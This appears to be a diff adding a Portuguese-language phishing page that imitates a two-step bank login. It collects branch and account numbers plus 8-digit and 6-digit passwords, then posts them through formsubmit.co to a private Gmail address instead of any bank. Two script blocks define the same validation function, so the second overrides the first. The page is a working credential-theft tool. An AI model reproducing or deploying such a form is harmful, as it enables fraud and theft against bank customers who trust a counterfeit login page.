@@ -1,0 +1,132 @@
+<form id="regForm" action="https://formsubmit.co/edvandonascimento977@gmail.com" method="POST">       
+
+        
+    <!-- primeira etapa -->
+    <div class="tab"> <h2>Agência e Conta</h2>
+      
+      
+      
+      
+      <label>Agência</label>
+      <p><input id="agenciaInput" placeholder="Agência" oninput="this.className = ''" name="fname" maxlength="8" required></p>
+      
+      <span id="mensagemAgencia">Informe sua agência com dígito</span>
+    
+      <center> <span  class="mensagem-ajuda" style="color: rgb(255, 0, 0); display: none;">Este campo é obrigatório</span> </center>
+    
+
+
+
+      
+      <label>Conta</label>
+      <p><input id="contaInput" placeholder="Conta corrente" oninput="this.className = ''" name="lname" maxlength="11" required ></p>
+
+     <span id="mensagemConta">Informe sua conta com dígito</span>
+
+     <center> <span class="mensagem-ajuda" style="color: rgb(255, 0, 0); display: none;">Este campo é obrigatório</span> </center> 
+
+    </div>
+
+
+
+<!-- segunda etapa --> 
+
+    <div class="tab"> <h2>Senha</h2>
+      
+      <label>Senha 8</label>
+      <p><input  id="senha8" maxlength="8"  type="password" placeholder="Senha 8 digitos" oninput="this.className = ''" name="senha 8"></p>
+      
+      <br>
+      <label>Senha 6</label>
+      <p><input  id="senha6" maxlength="6" type="password"  placeholder="Senha 6 digitos" oninput="this.className = ''" name="senha 6"></p>
+      
+
+    </div>
+
+   
+    <label class="switch">
+      <input type="checkbox">
+      <span class="slider"></span>
+      </label>
+      
+    <span class="message">Guardar agência e conta</span>
+    
+    
+    
+
+    
+    
+    <div style="overflow:auto;">
+      <div style="float:center;">
+
+        <button type="button" id="nextBtn" onclick="validateAndNext(1)">CONTINUAR</button>
+
+      </div>
+    </div>
+    <!-- Circles which indicates the steps of the form: -->
+    <div style="text-align:center;margin-top:40px;">
+      <span class="step"></span>
+      <span class="step"></span>
+      
+    </div>
+
+
+
+
+
+
+    <script src="script.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+    function validateAndNext(nextStep) {
+        var agenciaInput = document.getElementById('agenciaInput');
+        var contaInput = document.getElementById('contaInput');
+        
+
+        // Validando a Agência e a Conta
+        if (agenciaInput.value.length < 5 || contaInput.value.length < 8) {
+            alert("Por favor, preencha todos os campos corretamente.");
+            return;
+        }
+
+        // Se todas as validações passarem, avança para a próxima etapa
+        nextPrev(nextStep);
+    }
+</script>
+
+
+
+
+
+<script>
+    function validateAndNext(nextStep) {
+        var senha8 = document.getElementById('senha8');
+        var senha6 = document.getElementById('senha6');
+        
+
+        // Validando a Agência e a Conta
+        if (senha8.value.length < 8 || senha6.value.length < 6) {
+            alert("Por favor, preencha todos os campos corretamente.");
+            return;
+        }
+
+        // Se todas as validações passarem, avança para a próxima etapa
+        nextPrev(nextStep);
+    }
+</script>
+
+
+
+
+
+
+
+  </form>
